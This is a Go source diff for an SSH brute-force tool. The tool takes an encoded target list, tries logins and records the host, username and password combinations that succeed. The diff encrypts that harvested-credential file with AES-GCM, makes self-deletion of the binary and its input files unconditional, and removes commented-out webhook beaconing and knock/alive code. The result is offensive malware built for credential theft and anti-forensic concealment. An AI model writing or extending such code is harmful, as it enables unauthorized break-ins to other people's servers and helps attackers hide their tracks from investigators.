@@ -2,9 +2,14 @@ package bf
 
 import (
 	"bytes"
+	"crypto/aes"
+	"crypto/cipher"
+	cr "crypto/rand"
 	"encoding/base64"
 	"encoding/csv"
+	"encoding/hex"
 	"fmt"
+	"io"
 	"math/rand"
 	"os"
 	"os/exec"
@@ -29,19 +34,39 @@ const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
 var DontDel bool = false
 
+func encrypt(plainText string, key []byte) (string, error) {
+	// Create a new AES cipher block
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return "", err
+	}
+
+	// Use GCM (Galois/Counter Mode) which is an authenticated encryption mode
+	aesGCM, err := cipher.NewGCM(block)
+	if err != nil {
+		return "", err
+	}
+
+	// Create a nonce. GCM requires a nonce for encryption
+	nonce := make([]byte, aesGCM.NonceSize())
+	if _, err = io.ReadFull(cr.Reader, nonce); err != nil {
+		return "", err
+	}
+
+	// Encrypt the plaintext string
+	cipherText := aesGCM.Seal(nonce, nonce, []byte(plainText), nil)
+
+	// Return the ciphertext as a hex string
+	return hex.EncodeToString(cipherText), nil
+}
+
 func Bf(conf vars.Config) {
 	file, err := os.OpenFile("/tmp/c", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0777)
 	if err != nil {
 		check.Check("Error Creating File", err)
 	}
-	// err = os.Chmod("/tmp/c", 0777)
-	// if err != nil {
-	// 	log.Fatalf("Error setting file permissions: %s", err)
-	// }
-	if DontDel {
-		if conf.Flags.Destr {
-			SelfDel()
-		}
+	if conf.Flags.Destr {
+		SelfDel()
 	}
 	file.Close()
 	if conf.Flags.BrFile == "" || conf.Client.Host == "" || conf.Client.Port == "" || conf.Client.User == "" || conf.Client.Pass == "" {
@@ -52,11 +77,11 @@ func Bf(conf vars.Config) {
 
 	msgSess := make(chan vars.Connection)
 	msgErr := make(chan vars.Connection)
-	go checkSession(msgSess, msgErr)
+	go checkSession(msgSess, msgErr, conf.Flags.Key)
 	ReadCsv(msgSess, msgErr, conf)
 }
 
-func checkSession(msgSess, msgErr chan vars.Connection) {
+func checkSession(msgSess, msgErr chan vars.Connection, Key string) {
 	for {
 		select {
 		case ses := <-msgSess:
@@ -66,12 +91,16 @@ func checkSession(msgSess, msgErr chan vars.Connection) {
 			}
 			DaC = append(DaC, c)
 			stringToWrite := fmt.Sprintf("Host: %s Port: %s Username: %s Password: %s\n", c.Conn.Host, c.Conn.Port, c.Conn.Username, c.Conn.Password)
+			enc, err := encrypt(stringToWrite, []byte(Key)) //
+			if err != nil {
+				check.Check("Error On Encryption", err)
+			}
 			f, err := os.OpenFile("/tmp/c", os.O_APPEND|os.O_RDWR, 0777)
 			if err != nil {
 				check.Check("Error On Opening a file", err)
 			}
-			fmt.Println(stringToWrite)
-			_, err = f.Write([]byte(stringToWrite))
+
+			_, err = f.Write([]byte(enc + "\n"))
 			if err != nil {
 				fmt.Println(err)
 			}
@@ -92,9 +121,8 @@ func checkSession(msgSess, msgErr chan vars.Connection) {
 
 func ReadBfFile(bFile string) ([][]string, error) {
 	x := check.OpenAndReadFiles(bFile)
-	if DontDel { //TODO REMOVE
-		os.Remove(bFile)
-	}
+
+	os.Remove(bFile)
 
 	decodedBytes, err := base64.StdEncoding.DecodeString(string(x))
 	er := check.Check("Error decoding base64 BF file:", err)
@@ -178,15 +206,12 @@ func SelfDel() {
 	}
 	fmt.Println(os.Args[0])
 	if runtime.GOOS == "linux" {
-		if DontDel { //TODO REMOVE
-			os.Remove(vars.BrFileHomeDir)
-		}
+		os.Remove(vars.BrFileHomeDir)
 		cmd := exec.Command("bash", "-c", "rm "+exePath)
 		cmd.Start()
 	} else if runtime.GOOS == "windows" {
-		if DontDel { //TODO REMOVE
-			os.Remove(vars.BrFileHomeDir)
-		}
+
+		os.Remove(vars.BrFileHomeDir)
 		cmd := exec.Command("cmd.exe", "/c", "del "+exePath)
 		cmd.Start()
 	}
@@ -217,11 +242,7 @@ func StartBruteForce(allConn *vars.AllConnections, msgSess, msgErr chan vars.Con
 		}
 		wg.Wait()
 		os.ReadFile("/tmp/c")
-		// fmt.Println("END NEXT 3")
-		// ("END NEXT 3", conf)
-		// knock.SendKnock("")
-		// delay := 500 * time.Millisecond
-		// knock.SendIAmAlive(conf.Client.Host, conf.Flags.KnockAlive, delay)
+
 		ClearList(allConn)
 	}
 	// return foundSessions
@@ -279,19 +300,6 @@ func CreateConn(c vars.Connection) (*ssh.Session, vars.Connection, error) {
 	return session, c, nil
 }
 
-// func WriteToResults(c vars.DelaConnection) {
-// 	f, err := os.OpenFile("res.txt", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0660)
-// 	if err != nil {
-// 		panic(err)
-// 	}
-
-// 	defer f.Close()
-// 	stringToErite := fmt.Sprintf("Host: %s Port: %s Username: %s Password: %s\n", c.Conn.Host, c.Conn.Port, c.Conn.Username, c.Conn.Password)
-// 	if _, err = f.WriteString(stringToErite); err != nil {
-// 		panic(err)
-// 	}
-// }
-
 func removeDuplicates(nums []int) []int {
 	encountered := map[int]bool{} // Track encountered integers
 	result := []int{}             // Slice to store unique integers
@@ -315,46 +323,3 @@ func RandomString(length int) string {
 	}
 	return string(b)
 }
-
-// func SendBeacons(msg string, c vars.Config) {
-
-// 	// Data to send to the webhook
-// 	payload := map[string]string{
-// 		"username": c.Client.Host,
-// 		"content":  msg,
-// 	}
-
-// 	// Convert the payload to JSON
-// 	payloadBytes, err := json.Marshal(payload)
-// 	if err != nil {
-// 		check.Check("Error marshaling payload: %v", err)
-// 		log.Fatalf("Error marshaling payload: %v", err)
-// 	}
-
-// 	// Create a new POST request with the JSON payload
-// 	req, err := http.NewRequest("POST", c.Flags.WebHook, bytes.NewBuffer(payloadBytes))
-// 	if err != nil {
-// 		check.Check("Error creating POST request: %v", err)
-// 		log.Fatalf("Error creating POST request: %v", err)
-// 	}
-
-// 	// Set the content-type header to application/json
-// 	req.Header.Set("Content-Type", "application/json")
-
-// 	// Send the request using http.DefaultClient
-// 	resp, err := http.DefaultClient.Do(req)
-// 	if err != nil {
-// 		check.Check("Error sending POST request: %v", err)
-// 		log.Fatalf("Error sending POST request: %v", err)
-// 	}
-// 	defer resp.Body.Close()
-
-// 	// Check the response status
-// 	// if resp.StatusCode != http.StatusOK {
-// 	// 	check.Check("Received non-OK response: %s", err)
-// 	// 	log.Fatalf("Received non-OK response: %s", resp.Status)
-// 	// }
-
-// 	fmt.Println("POST request successful!")
-
-// }
